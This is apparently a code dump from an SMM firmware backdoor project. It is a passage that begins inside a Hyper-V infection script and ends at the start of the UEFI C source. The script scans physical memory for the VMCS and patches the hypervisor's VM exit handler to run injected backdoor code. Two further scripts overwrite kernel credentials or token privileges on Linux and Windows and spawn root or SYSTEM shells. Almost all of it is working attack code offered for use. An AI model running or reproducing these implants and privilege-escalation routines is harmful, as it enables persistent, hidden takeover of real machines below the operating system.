    .text:FFFFF80000232436      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000023243B      mov     rdx, [rsp+arg_28]
    .text:FFFFF80000232440      call    sub_FFFFF8000020E010

'''
HV_SIG_2004 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x0d, 0x48), (0x0e, 0x89), (0x0f, 0x01),
                 (0x10, 0x48), (0x11, 0x89), (0x12, 0x51), (0x13, 0x10),
                 (0x40, 0x4c), (0x41, 0x89), (0x42, 0x79), (0x43, 0x78),
                 (0xce, 0xe8) ], 0xce, 19041 ]
'''

Match hvix64.sys VM exit handler signature for Windows 10 22H2:

    .text:FFFFF8000023E313      mov     [rsp+arg_20], rcx
    .text:FFFFF8000023E318      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000023E31D      mov     rcx, [rcx]
    .text:FFFFF8000023E320      mov     [rcx], rax
    .text:FFFFF8000023E323      mov     [rcx+10h], rdx
    
    ...

    .text:FFFFF8000023E353      mov     [rcx+78h], r15
    .text:FFFFF8000023E357      mov     rax, [rsp+arg_20]
    .text:FFFFF8000023E35C      mov     [rcx+8], rax
    .text:FFFFF8000023E360      lea     rax, [rcx+70h]
    
    ...

    .text:FFFFF8000023E3D5      mov     rcx, [rsp+arg_18]
    .text:FFFFF8000023E3DA      mov     rdx, [rsp+arg_28]
    .text:FFFFF8000023E3DF      call    sub_FFFFF800002118D0

'''
HV_SIG_22H2 = [[ (0x00, 0x48), (0x01, 0x89), (0x02, 0x4c), (0x03, 0x24),
                 (0x0d, 0x48), (0x0e, 0x89), (0x0f, 0x01),
                 (0x10, 0x48), (0x11, 0x89), (0x12, 0x51), (0x13, 0x10),
                 (0x40, 0x4c), (0x41, 0x89), (0x42, 0x79), (0x43, 0x78),
                 (0xcc, 0xe8) ], 0xcc, 19045 ]

# all of the signatures for known versions of Hyper-V
HV_SIG = [ HV_SIG_1709, HV_SIG_1803, HV_SIG_1809, HV_SIG_1903, HV_SIG_2004, HV_SIG_22H2 ]


def find_vmcs(addr = None):

    addr = mem_scan_from if addr is None else addr

    while addr < mem_scan_to:

        if m_verbose:

            print(' * 0x%.16x' % addr)

        # ask SMM backdoor to scan memory region for potential VMCS
        vmcs_addr = bd.find_vmcs(addr, mem_scan_step)

        if vmcs_addr is not None:                    

            # potential VMCS region was found
            return vmcs_addr

        else:

            # check the next region
            addr += mem_scan_step

    return None


def find_low_mem(cr3):

    for i in range(0, 0x10):

        addr_virt = bd.PAGE_SIZE * i
        addr_phys = bd.get_phys_addr(addr_virt, cr3 = cr3, eptp = None)

        # check for allocated and mapped low memory page
        if addr_virt == addr_phys:

            # check for the short jump instruction
            if bd.read_phys_mem_1(addr_phys) == 0xeb:

                return addr_virt
            
    return None


def find_vm_exit_call(code):

    # enumerate known signatures
    for sign, call_offset, version in HV_SIG:

        for i in range(0, len(code) - 0x200):

            matched = True

            for offset, value in sign:

                # match each byte of the signature
                if value != ord(code[i + offset]):

                    matched = False
                    break

            if matched:

                # return host OS version and call offset
                return version, i + call_offset                

    return None


def get_hv_info():

    vmcs_addr = 0

    #
    # Some instructions from Hyper-V VM exit handler entry 
    # to validate potential HOST_RIP value
    #
    sign = [ '\x48\x89\x51\x10',    # mov     [rcx+10h], rdx
             '\x48\x89\x59\x18',    # mov     [rcx+18h], rbx
             '\x48\x89\x69\x28',    # mov     [rcx+28h], rbp
             '\x48\x89\x71\x30',    # mov     [rcx+30h], rsi
             '\x48\x89\x79\x38' ]   # mov     [rcx+38h], rdi

    print('[+] Searching for VMCS structure in physical memory, this might take a while...\n')
    
    print(' Scan step: 0x%.16x' % mem_scan_step)
    print(' Scan from: 0x%.16x' % mem_scan_from)
    print('   Scan to: 0x%.16x\n' % mem_scan_to)

    while vmcs_addr < mem_scan_to:

        # scan physical memory for VMCS candidate
        vmcs_addr = find_vmcs(addr = vmcs_addr if vmcs_addr > 0 else None)

        if vmcs_addr is None:

            # nothing found
            return None

        ptr, host_cr3_list, host_rip_list = 0, [], []

        # read VMCS contents
        data = bd.read_phys_mem(vmcs_addr, HV_MAX_VMCS)

        while ptr < HV_MAX_VMCS:
            
            # get single VMCS field
            val, = unpack('Q', data[ptr : ptr + 8])

            if val != 0:

                if val > 0xfffff80000000000 and val < 0xffffffffff000000:

                    # possible HOST_RIP value
                    host_rip_list.append(val)

                elif val < HV_MAX_CR3 and val % bd.PAGE_SIZE == 0:

                    # possible HOST_CR3 value
                    host_cr3_list.append(val)

            ptr += 8

        for host_cr3 in host_cr3_list:

            for host_rip in host_rip_list:

                # try to get HOST_RIP physical address
                addr_phys = bd.get_phys_addr(host_rip, cr3 = host_cr3, eptp = None)

                if addr_phys is not None:

                    # read some code from the hypervisor entry
                    data = bd.read_phys_mem(bd.align_down(addr_phys, bd.PAGE_SIZE), bd.PAGE_SIZE)

                    # check for VM exit handler signature
                    if data.find(''.join(sign)) != -1:

                        return vmcs_addr, host_rip, host_cr3

        # VMCS is not valid, continue scan
        vmcs_addr += bd.PAGE_SIZE

    return None


def get_pte(cr3, addr):

    table_addr = lambda table, index: table + (index * 8)
    table_entry = lambda table, index: bd.read_phys_mem_8(table_addr(table, index))

    # read PML4 entry
    PML4_entry = table_entry(PML4_address(cr3), PML4_index(addr))

    # chek present bit
    assert PML4_entry & PT_PRESENT != 0

    PDPT_addr = pfn_to_page(PML4_entry)

    # read PDPT entry
    PDPT_entry = table_entry(PDPT_addr, PDPT_index(addr))    
    
    if PDPT_entry & PT_PS != 0:

        # return 1GB page information
        return PDPT_entry, table_addr(PDPT_addr, PDPT_index(addr))        

    # chek present bit
    assert PDPT_entry & PT_PRESENT != 0

    PD_addr = pfn_to_page(PDPT_entry)

    # read PD entry
    PD_entry = table_entry(PD_addr, PDE_index(addr))        
    
    if PD_entry & PT_PS != 0:

        # return 2MB page information
        return PD_entry, table_addr(PD_addr, PDE_index(addr))

    # check present bit
    assert PD_entry & PT_PRESENT != 0

    PT_addr = pfn_to_page(PD_entry)

    # read PT entry
    PT_entry = table_entry(PT_addr, PTE_index(addr))    

    # return 4KB page information
    return PT_entry, table_addr(PT_addr, PTE_index(addr))


def infect():

    jump_32_len = 5
    jump_64_len = 14

    # to calculate jump/call displacement
    jump_32_op = lambda src, dst: pack('i', dst - src - jump_32_len)

    # to generate 64-bit address jump
    jump_64 = lambda addr: '\xff\x25\x00\x00\x00\x00' + pack('Q', addr)

    # find HOST_RIP and HOST_CR3 fields of VMCS
    info = get_hv_info()
    if info is None:

        print('ERROR: Unable to find VMCS')
        return -1

    vmcs_addr, host_rip, host_cr3 = info

    print('[+] Hypervisor VMCS structure was found\n')

    print(' Physical address: 0x%.16x' % vmcs_addr)
    print('         HOST_CR3: 0x%.16x' % host_cr3)
    print('         HOST_RIP: 0x%.16x\n' % host_rip)    

    # find HvlpLowMemoryStub() page
    low_mem = find_low_mem(host_cr3)
    if low_mem is None:

        print('ERROR: Unable to find HvlpLowMemoryStub()')
        return -1

    print('[+] HvlpLowMemoryStub() is at 0x%.16x' % low_mem)

    # backdoor code location
    backdoor_addr = low_mem + BACKDOOR_OFFSET

    # HVBD_DATA structure location
    hvbd_addr = low_mem + bd.PAGE_SIZE - HVBD_DATA_SIZE    
    
    code_virt = bd.align_down(host_rip, bd.PAGE_SIZE)
    code_phys = bd.get_phys_addr(code_virt, cr3 = host_cr3, eptp = None)

    assert code_phys is not None

    # read HOST_RIP code page
    code = bd.read_phys_mem(code_phys, bd.PAGE_SIZE)

    # find VM exit handler call by signature
    info = find_vm_exit_call(code)
    if info is None:

        print('ERROR: Unable to match VM exit handler signature')
        return -1

    hv_version, offset = info

    # get address of VM exit handler call
    vm_call_virt = code_virt + offset
    vm_call_phys = bd.get_phys_addr(vm_call_virt, cr3 = host_cr3, eptp = None)
    
    assert vm_call_phys is not None    

    # get VM exit handler call displacement operand
    call_op, = unpack('i', bd.read_phys_mem(vm_call_phys + 1, 4))

    # get address of VM exit handler
    vm_exit_virt = vm_call_virt + call_op + jump_32_len
    vm_exit_phys = bd.get_phys_addr(vm_exit_virt, cr3 = host_cr3, eptp = None)

    assert vm_exit_phys is not None

    print('[+] Host operating system version is %d' % hv_version)    
    print('[+] VM exit handler is at 0x%.16x' % vm_exit_virt)
    print('[+] VM exit handler call is at 0x%.16x' % vm_call_virt)  

    # check if VM exit call operand was already patched
    if abs(call_op) < bd.PAGE_SIZE:

        print('Hyper-V backdoor is already installed')
        return 0      

    # get low memory stub page table entry
    pte_val, pte_addr = get_pte(host_cr3, low_mem)

    assert pte_val & PT_PRESENT != 0

    # make memory page writeable
    pte_val |= PT_RW    

    # update page table entry
    bd.write_phys_mem_8(pte_addr, pte_val)  

    # find padding to place 14 bytes jump
    jump_offset = code.find('\xcc' * jump_64_len)
    if jump_offset == -1:

        print('ERROR: Unable to find free space for 14 bytes jump')
        return -1

    jump_addr = bd.align_down(vm_call_virt, bd.PAGE_SIZE) + jump_offset

    print('[+] 14 bytes jump is at 0x%.16x' % jump_addr)

    assert os.path.isfile(BACKDOOR_PATH)

    with open(BACKDOOR_PATH, 'rb') as fd:        

        # read the backdoor code
        backdoor_body = fd.read()

    reg_push = [ '\x50',                            # push   rax
                 '\x0f\x20\xd8',                    # mov    rax, cr3
                 '\x0f\x22\xd8',                    # mov    cr3, rax
                 '\x51',                            # push   rcx
                 '\x52',                            # push   rdx
                 '\x53',                            # push   rbx
                 '\x56',                            # push   rsi
                 '\x57',                            # push   rdi
                 '\x55',                            # push   rbp
                 '\x41\x50',                        # push   r8
                 '\x41\x51',                        # push   r9
                 '\x41\x52',                        # push   r10
                 '\x41\x53',                        # push   r11
                 '\x41\x54',                        # push   r12
                 '\x41\x55',                        # push   r13
                 '\x41\x56',                        # push   r14
                 '\x41\x57',                        # push   r15
                 '\xe8\x00\x00\x00\x00',            # call   $+5
                 '\x5a',                            # pop    rdx
                 '\x48\x81\xe2\x00\xf0\xff\xff',    # and    rdx, 0xfffffffffffff000
                 '\x48\x83\xec\x28' ]               # sub    rsp, 0x28

    reg_pop  = [ '\x48\x83\xc4\x28',                # add    rsp, 0x28
                 '\x41\x5f',                        # pop    r15
                 '\x41\x5e',                        # pop    r14
                 '\x41\x5d',                        # pop    r13
                 '\x41\x5c',                        # pop    r12
                 '\x41\x5b',                        # pop    r11
                 '\x41\x5a',                        # pop    r10
                 '\x41\x59',                        # pop    r9
                 '\x41\x58',                        # pop    r8
                 '\x5d',                            # pop    rbp
                 '\x5f',                            # pop    rdi
                 '\x5e',                            # pop    rsi
                 '\x5b',                            # pop    rbx
                 '\x5a',                            # pop    rdx
                 '\x59',                            # pop    rcx
                 '\x58'  ]                          # pop    rax

    backdoor_code, backdoor_entry = '', 0
    
    # the backdoor body
    backdoor_code += backdoor_body

    # calculate entry address of the backdoor
    backdoor_entry = backdoor_addr + len(backdoor_code)

    print('[+] Backdoor entry is at 0x%.16x' % backdoor_entry)

    # registers save code
    backdoor_code += ''.join(reg_push)

    # backdoor body call
    backdoor_code += '\xe8' + jump_32_op(backdoor_addr + len(backdoor_code), backdoor_addr)

    # registers restore code
    backdoor_code += ''.join(reg_pop)

    # 14 bytes jump to VM exit handler
    backdoor_code += jump_64(vm_exit_virt)

    print('[+] Backdoor code size is %d bytes' % len(backdoor_code))

    # write complete backdoor code into the memory
    bd.write_phys_mem(backdoor_addr, backdoor_code)    

    assert hvbd_addr > backdoor_addr + len(backdoor_code)

    # write HVBD_DATA structure into the memory
    bd.write_phys_mem(hvbd_addr, '\0' * HVBD_DATA_SIZE)

    # write HVBD_DATA Version field
    bd.write_phys_mem_8(hvbd_addr + HVBD_VERSION, hv_version)

    # write HVBD_DATA VmExitHandler field
    bd.write_phys_mem_8(hvbd_addr + HVBD_HANDLER, vm_exit_virt)

    # write 14 bytes jump to the backdoor entry
    bd.write_phys_mem(code_phys + jump_offset, jump_64(backdoor_entry))

    print('[+] Patching VM exit handler call...')

    # patch VM exit handler call
    bd.write_phys_mem(vm_call_phys + 1, jump_32_op(vm_call_virt, jump_addr))

    #
    # Wait for the first VM exit with backdoor installed to flush TLB,
    # we need to do this because we changed memory protection of 
    # HvlpLowMemoryStub() from RX to RWX. After that we can patch 
    # backdoor entry to remove TLB flush instructions.
    #
    time.sleep(VM_EXIT_WAIT)

    # replace TLB flush instructions with NOPs
    bd.write_phys_mem(backdoor_entry + 1, '\x90' * 6)

    print('[+] Done, Hyper-V backdoor was successfully installed')

    return 0


def main():

    global m_verbose, mem_scan_step, mem_scan_from, mem_scan_to

    option_list = [    

        make_option('--scan-step', dest = 'scan_step', default = None,
            help = 'size of VMCS memory scan step'),    

        make_option('--scan-from', dest = 'scan_from', default = None,
            help = 'start address of VMCS memory scan'),

        make_option('--scan-to', dest = 'scan_to', default = None,
            help = 'end address of VMCS memory scan'),

        make_option('-v', '--verbose', dest = 'verbose', default = False, action = 'store_true',
            help = 'show progress during VMCS scan')
    ]

    parser = OptionParser(option_list = option_list)
    options, args = parser.parse_args()

    # check OS
    assert platform.system() == 'Windows'

    # check for 64-bit process
    assert ctypes.sizeof(ctypes.c_void_p) == ctypes.sizeof(ctypes.c_uint64)

    m_verbose = options.verbose

    # set memory scan options
    mem_scan_step = mem_scan_step if options.scan_step is None else int(options.scan_step, 16)
    mem_scan_from = mem_scan_from if options.scan_from is None else int(options.scan_from, 16)
    mem_scan_to = mem_scan_to if options.scan_to is None else int(options.scan_to, 16)

    print('[+] Initializing SMM backdoor client...')

    bd.init(use_timer = True)
    bd.ping()

    try:

        # inject Hyper-V backdoor
        return infect()    

    except KeyboardInterrupt:

        print('\nEXIT\n')

    return 0


if __name__ == '__main__':

    exit(main())

#
# EoF
#

```

`smm_backdoor_privesc_linux.py`:

```py
#!/usr/bin/env python

import sys, os, platform, ctypes
from struct import pack, unpack

import smm_backdoor as bd

try:

    import capstone

except ImportError:

    print('ERROR: Capstone engine is not installed')
    exit(-1)


# MSR registers
LSTAR = 0xc0000082
IA32_KERNEL_GS_BASE = 0xc0000102

# getuid() syscal number
NR_getuid = 102

# struct cred field offsets
cred_uid  = 4 * 1
cred_gid  = 4 * 2
cred_suid = 4 * 3
cred_sgid = 4 * 4
cred_euid = 4 * 5
cred_egid = 4 * 6


def find_task_struct(cr3 = None, entry_SYSCALL_64 = None):

    to_ulong_64 = lambda val: unpack('Q', pack('q', val))[0]

    if cr3 is None:

        cr3 = bd.state_get(bd.SMM_SAVE_STATE_CR3)

        print('[+] User CR3 = 0x%x' % cr3)

    if entry_SYSCALL_64 is None:

        entry_SYSCALL_64 = bd.msr_get(LSTAR)

        print('[+] LSTAR = 0x%x' % entry_SYSCALL_64)

    # needed kernel symbols
    do_syscall_64 = None
    sys_call_table = None

    # needed offsets
    task_struct = None
    task_struct_cred = None

    # kernel CR3 value for PTI enabled system
    cr3_kern = None

    data = bd.read_virt_mem(entry_SYSCALL_64, 0x100, cr3 = cr3)

    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    md.detail = True    

    # disassemble entry_SYSCALL_64()
    for insn in md.disasm(data, entry_SYSCALL_64):    

        if insn.id == capstone.x86.X86_INS_AND:

            # check for the SWITCH_TO_KERNEL_CR3
            if insn.operands[0].type == capstone.x86.X86_OP_REG and \
               insn.operands[1].type == capstone.x86.X86_OP_IMM:

                if insn.operands[0].reg == capstone.x86.X86_REG_RSP:

                    # obtain kernel CR3 value
                    cr3_kern = cr3 & to_ulong_64(insn.operands[1].imm)

                    print('[+] Kernel CR3 = 0x%x' % cr3_kern)

        if insn.id == capstone.x86.X86_INS_MOV:

            # check for the entry_SYSCALL_64_stage2() jump
            if insn.operands[0].type == capstone.x86.X86_OP_REG and \
               insn.operands[1].type == capstone.x86.X86_OP_IMM:

                if insn.operands[0].reg == capstone.x86.X86_REG_RDI and cr3_kern is not None:

                    entry_SYSCALL_64_stage2 = to_ulong_64(insn.operands[1].imm)

                    print('[+] entry_SYSCALL_64_stage2() is at 0x%x' % entry_SYSCALL_64_stage2)

                    # analyze entry_SYSCALL_64_stage2() on KPTI enabled system
                    return find_task_struct(cr3 = cr3_kern, entry_SYSCALL_64 = entry_SYSCALL_64_stage2)
        
        if insn.id == capstone.x86.X86_INS_CALL:

            # check for the do_syscall_64() call
            if insn.operands[0].type == capstone.x86.X86_OP_IMM:

                do_syscall_64 = to_ulong_64(insn.operands[0].imm)            
                break

    if do_syscall_64 is None:

        print('ERROR: Unable to find do_syscall_64()')
        return None

    print('[+] do_syscall_64() is at 0x%x' % do_syscall_64)

    data = bd.read_virt_mem(do_syscall_64, 0x100, cr3 = cr3)

    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    md.detail = True

    # disassemble do_syscall_64()
    for insn in md.disasm(data, do_syscall_64):    

        if insn.id == capstone.x86.X86_INS_MOV:

            if insn.operands[0].type == capstone.x86.X86_OP_REG and \
               insn.operands[1].type == capstone.x86.X86_OP_MEM:

                op = insn.operands[1].mem

                if op.disp != 0 and op.scale == 8 and op.segment == capstone.x86.X86_REG_INVALID:
                
                    # obtain sys_call_table address
                    sys_call_table = to_ulong_64(op.base + op.disp)
                    break

    if sys_call_table is None:

        print('ERROR: Unable to find sys_call_table')
        return None

    print('[+] sys_call_table() is at 0x%x' % sys_call_table)

    # obtain sys_getuid() handler address
    sys_getuid = bd.read_virt_mem_8(sys_call_table + (NR_getuid * 8), cr3 = cr3)

    print('[+] sys_getuid() is at 0x%x' % sys_getuid)

    data = bd.read_virt_mem(sys_getuid, 0x100, cr3 = cr3)

    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    md.detail = True

    insn_prev = None

    # disassemble sys_getuid()
    for insn in md.disasm(data, sys_getuid):    

        if task_struct is None:

            if insn.id == capstone.x86.X86_INS_MOV:

                # check for the task_struct access
                if insn.operands[0].type == capstone.x86.X86_OP_REG and \
                   insn.operands[1].type == capstone.x86.X86_OP_MEM:

                    op = insn.operands[1].mem

                    if op.disp != 0 and op.segment == capstone.x86.X86_REG_GS:

                        insn_prev = insn
                        task_struct = op.disp
                        continue

        else:

            if insn.id == capstone.x86.X86_INS_MOV:

                # check for the task_struct->cred access in the next instruction
                if insn.operands[0].type == capstone.x86.X86_OP_REG and \
                   insn.operands[1].type == capstone.x86.X86_OP_MEM:

                    op = insn.operands[1].mem

                    if op.disp != 0 and op.base == insn_prev.operands[0].reg:

                        task_struct_cred = op.disp                
            break

    if task_struct is None:

        print('ERROR: Unable to find task_struct offset')
        return None

    if task_struct_cred is None:

        print('ERROR: Unable to find cred offset')
        return None

    return cr3, task_struct, task_struct_cred


def privesc(command_line = None, uid = 0, gid = 0, euid = 0, egid = 0):

    # obtain kernel CR3 and needed offsets
    ret = find_task_struct()
    if ret is None:

        print('ERROR: find_task_struct() failed')
        return -1

    cr3, task_struct, task_struct_cred = ret

    print('[+] task_struct offset is 0x%x' % task_struct)
    print('[+] cred offset is 0x%x' % task_struct_cred)

    # get kernel GS segment base
    gs_base = bd.msr_get(IA32_KERNEL_GS_BASE)

    print('[+] IA32_KERNEL_GS_BASE = 0x%x' % gs_base)

    # get task_struct address for current process
    addr_task_struct = bd.read_virt_mem_8(gs_base + task_struct, cr3 = cr3)

    print('[+] Process task_struct is at 0x%x' % addr_task_struct)

    # get task_struct->cred address
    addr_task_struct_cred = bd.read_virt_mem_8(addr_task_struct + task_struct_cred, cr3 = cr3)

    print('[+] Process cred is at 0x%x' % addr_task_struct_cred)

    task_struct_get = lambda offs: bd.read_virt_mem_4(addr_task_struct_cred + offs, cr3 = cr3)
    task_struct_set = lambda offs, val: bd.write_virt_mem_4(addr_task_struct_cred + offs, val, cr3 = cr3)

    # read current uid/gid/euid/egid values
    curr_uid = task_struct_get(cred_uid)
    curr_gid = task_struct_get(cred_gid)
    curr_euid = task_struct_get(cred_euid)
    curr_egid = task_struct_get(cred_egid)

    # sanity check
    if curr_uid != os.getuid() or curr_euid != os.geteuid() or \
       curr_gid != os.getuid() or curr_euid != os.getegid():

        print('ERROR: Bogus cred')
        return -1

    print('[+] Overwriting process credentials...')

    # overwrite task_struct->cred fields
    task_struct_set(cred_uid, uid)
    task_struct_set(cred_gid, gid)
    task_struct_set(cred_suid, uid)
    task_struct_set(cred_sgid, gid)
    task_struct_set(cred_euid, euid)
    task_struct_set(cred_egid, egid)

    if command_line is None:

        print('[+] Done, spawning root shell...\n')

        # spawn shell
        os.system('/bin/sh')

    else:

        os.system(command_line)

    return 0


def main():

    # check OS
    assert platform.system() == 'Linux'

    # check for 64-bit process
    assert ctypes.sizeof(ctypes.c_void_p) == ctypes.sizeof(ctypes.c_uint64)

    print('[+] Initializing SMM backdoor client...')

    bd.init(use_timer = True)
    bd.ping()

    return privesc()    


if __name__ == '__main__':

    exit(main())

#
# EoF
#

```

`smm_backdoor_privesc_win.py`:

```py
#!/usr/bin/env python

import sys, os, platform, ctypes, ctypes.wintypes
from struct import pack, unpack

import smm_backdoor as bd


# MSR register used by swapgs
IA32_KERNEL_GS_BASE = 0xc0000102

# OpenProcess() access flags
PROCESS_QUERY_INFORMATION = 0x400
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

# OpenProcessToken() access flags
TOKEN_ADJUST_PRIVILEGES = 0x20

# _TOKEN structure field offsets
TOKEN_Privileges_Preset  = 0x40
TOKEN_Privileges_Enabled = 0x48

# value for _SEP_TOKEN_PRIVILEGES Present and Enabled fields
TOKEN_PRIVILEGES_VAL = 0x1ff2ffffbc

# system process PID
SYSTEM_PID = 4


def get_object_addr(process_id, handle_value):

    # NTSTATUS values
    STATUS_SUCCESS              = 0x00000000
    STATUS_INFO_LENGTH_MISMATCH = 0xc0000004

    # information class
    SystemHandleInformation = 16

    # change return value to unsigned
    ntdll = ctypes.windll.ntdll
    ntdll.NtQuerySystemInformation.restype = ctypes.c_ulong

    size = ctypes.sizeof(ctypes.c_void_p)

    class SYSTEM_HANDLE(ctypes.Structure):

        _fields_ = [( 'ProcessId',          ctypes.wintypes.DWORD  ),
                    ( 'ObjectType',         ctypes.wintypes.BYTE   ),
                    ( 'HandleAttributes',   ctypes.wintypes.BYTE   ),
                    ( 'HandleValue',        ctypes.wintypes.WORD   ),
                    ( 'ObjectAddress',      ctypes.wintypes.LPVOID ),
                    ( 'GrantedAccess',      ctypes.wintypes.DWORD  )]

    while True:            

        # allocate information buffer
        buff = ctypes.c_buffer(size)
    
        # get system handles information
        return_length = ctypes.c_ulong(0)    
        return_status = ntdll.NtQuerySystemInformation(SystemHandleInformation, buff, size, 
                                                       ctypes.byref(return_length))

        if return_status == STATUS_SUCCESS:

            # return length sanity check
            assert return_length.value % ctypes.sizeof(SYSTEM_HANDLE) == ctypes.sizeof(ctypes.c_uint64)

            # calculate number of returned handles
            count = (return_length.value - ctypes.sizeof(ctypes.c_uint64)) / ctypes.sizeof(SYSTEM_HANDLE)

            class SYSTEM_HANDLE_INFORMATION(ctypes.Structure):

                _fields_ = [( 'HandleCount',    ctypes.c_ulong        ),
                            ( 'Handles',        SYSTEM_HANDLE * count )]    

            # get SYSTEM_HANDLE_INFORMATION from the raw buffer
            info = SYSTEM_HANDLE_INFORMATION.from_buffer_copy(buff)

            for handle in info.Handles:

                # match handle value
                if handle.ProcessId == process_id and handle.HandleValue == handle_value:

                    # return object address
                    return handle.ObjectAddress

            break

        elif return_status == STATUS_INFO_LENGTH_MISMATCH:

            # set buffer size, add 0x1000 just for sure
            size = return_length.value + 0x1000

        else:

            raise(Exception('NtQuerySystemInformation() ERROR 0x%x' % return_status))

    # handle information is not found
    return None


def privesc(command_line = None):

    try:

        # get windows version and build number
        os_major, os_minor, os_build = map(lambda n: int(n), platform.version().split('.'))

    except ValueError:

        print('ERROR: Unable to get NT version')
        return -1 

    print('[+] NT version is %d.%d.%d' % (os_major, os_minor, os_build))
    
    EPROCESS_Token = None
    KPCR_KernelDirectoryTableBase = None

    if os_major == 6 and os_minor == 1:

        # Windows 7 and Server 2008 R2
        EPROCESS_Token = 0x0208

    elif os_major == 6 and os_minor == 2:

        # Windows 8 and Server 2012
        EPROCESS_Token = 0x0348

    elif os_major == 6 and os_minor == 3:

        # Windows 8.1 and Server 2012 R2
        EPROCESS_Token = 0x0348

    elif os_major == 10 and os_minor == 0:

        if os_build > 19043:

            raise(Exception('Unsupported Windows 10 version'))   

        elif os_build >= 19041:

            # Windows 10 starting from 2004 and Server 2019
            EPROCESS_Token = 0x04b8

        elif os_build >= 18362:

            # Windows 10 starting from 1903 and Server 2019
            EPROCESS_Token = 0x0360

        else:

            # Windows 10 and Server 2016
            EPROCESS_Token = 0x0358

        # kernel CR3 offsset from GS segment base
        if os_build in [19043, 19042, 19041]:

            # 21H1, 20H2, 2004
            KPCR_KernelDirectoryTableBase = 0x9000

        elif os_build in [18363, 18362, 17763, 17134]:

            # 1909, 1903, 1809, 1803
            KPCR_KernelDirectoryTableBase = 0x7000

    else:

        raise(Exception('Unsupported NT version'))

    print('[+] _EPROCESS Token offset is 0x%.4x' % EPROCESS_Token)

    # get user mode CR3 value
    user_cr3 = bd.state_get(bd.SMM_SAVE_STATE_CR3)    

    if KPCR_KernelDirectoryTableBase is not None:

        print('[+] _KPCR KernelDirectoryTableBase offset is 0x%.4x' % KPCR_KernelDirectoryTableBase)

        # get kernel GS base
        kpcr_addr = bd.msr_get(IA32_KERNEL_GS_BASE)    

        print('[+] _KPCR structure is at 0x%.16x' % kpcr_addr)

        # read kernel mode CR3 value for KVA shadow enabled system
        kernel_cr3 = bd.read_virt_mem_8(kpcr_addr + KPCR_KernelDirectoryTableBase, cr3 = user_cr3)

    else:

        # KVA shadow is not present on this OS version
        kernel_cr3 = 0

    if kernel_cr3 == 0:

        # KVA shadow is disabled
        kernel_cr3 = user_cr3

        print('[+] KVA shadow is disabled or not present')
        print('[+] Kernel CR3 value is 0x%.16x' % kernel_cr3)

    else:

        print('[+] KVA shadow is enabled')
        print('[+] User CR3 value is 0x%.16x' % user_cr3)
        print('[+] Kernel CR3 value is 0x%.16x' % kernel_cr3)

    kernel32 = ctypes.windll.kernel32

    # open current process
    cur_proc_handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, 0, os.getpid())
    if cur_proc_handle == 0:

        print('ERROR: OpenProcess() fails')
        return -1

    cur_token_handle = ctypes.wintypes.HANDLE(0)

    # open current process token
    if kernel32.OpenProcessToken(cur_proc_handle, TOKEN_ADJUST_PRIVILEGES, 
                                 ctypes.byref(cur_token_handle)) == 0:

        print('ERROR: OpenProcessToken() fails')
        return -1

    # get token object address
    cur_token_addr = get_object_addr(os.getpid(), cur_token_handle.value)
    if cur_token_addr is None:

        print('ERROR: Unable to find token object address')
        return -1

    print('[+] Token object address is 0x%.8x' % cur_token_addr)

    # read present privileges field
    priv_present = bd.read_virt_mem_8(cur_token_addr + TOKEN_Privileges_Preset, cr3 = kernel_cr3)

    print('[+] Present privileges: 0x%x -> 0x%x' % (priv_present, TOKEN_PRIVILEGES_VAL))

    # read enabled privileges field
    priv_enabled = bd.read_virt_mem_8(cur_token_addr + TOKEN_Privileges_Enabled, cr3 = kernel_cr3)

    print('[+] Enabled privileges: 0x%x -> 0x%x' % (priv_enabled, TOKEN_PRIVILEGES_VAL))

    # update _SEP_TOKEN_PRIVILEGES fields
    bd.write_virt_mem_8(cur_token_addr + TOKEN_Privileges_Preset, TOKEN_PRIVILEGES_VAL, cr3 = kernel_cr3)
    bd.write_virt_mem_8(cur_token_addr + TOKEN_Privileges_Enabled, TOKEN_PRIVILEGES_VAL, cr3 = kernel_cr3)

    # open system process
    sys_proc_handle = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, SYSTEM_PID)
    if sys_proc_handle == 0:

        print('ERROR: OpenProcess() fails')
        return -1

    # get current process object address
    cur_proc_addr = get_object_addr(os.getpid(), cur_proc_handle)
    if cur_proc_addr is None:

        print('ERROR: Unable to find current process object address')
        return -1

    print('[+] Current process object address is 0x%.8x' % cur_proc_addr)

    # get system process object address
    sys_proc_addr = get_object_addr(os.getpid(), sys_proc_handle)
    if sys_proc_addr is None:

        print('ERROR: Unable to find current process object address')
        return -1

    print('[+] System process object address is 0x%.8x' % sys_proc_addr)
    print('[+] Overwriting process token...')

    # read system process token
    token = bd.read_virt_mem_8(sys_proc_addr + EPROCESS_Token, cr3 = kernel_cr3)

    # update current process token
    bd.write_virt_mem_8(cur_proc_addr + EPROCESS_Token, token, cr3 = kernel_cr3)

    if command_line is None:

        print('[+] Done, spawning SYSTEM shell...\n')

        # spawn shell
        os.system('cmd.exe')

    else:

        os.system(command_line)

    return 0


def main():

    # check OS
    assert platform.system() == 'Windows'

    # check for 64-bit process
    assert ctypes.sizeof(ctypes.c_void_p) == ctypes.sizeof(ctypes.c_uint64)

    print('[+] Initializing SMM backdoor client...')

    bd.init(use_timer = True)
    bd.ping()

    return privesc()    


if __name__ == '__main__':

    exit(main())

#
# EoF
#

```

`src/asm/amd64/common_asm.asm`:

```asm
.code

public get_addr

get_addr:

    call    _lb
    
_lb:

    pop     rax
    ret

end

```

`src/asm/common_asm.h`:

```h

VOID * EFIAPI get_addr(VOID);

```

`src/backdoor.c`:

```c
#include <FrameworkSmm.h>

#include <Protocol/LoadedImage.h>
#include <Protocol/SmmAccess2.h>
#include <Protocol/SmmBase2.h>
#include <Protocol/SmmSwDispatch2.h>
#include <Protocol/SmmPeriodicTimerDispatch2.h>
#include <Protocol/SmmCpu.h>

#include <IndustryStandard/PeImage.h>

#include "../config.h"
#include "../interface.h"

#include "common.h"
#include "printf.h"
#include "serial.h"
#include "debug.h"
#include "loader.h"
#include "ovmf.h"
#include "backdoor.h"
#include "exploit.h"
#include "std.h"
#include "virtmem.h"
#include "asm/common_asm.h"

#pragma warning(disable: 4054)
#pragma warning(disable: 4055)
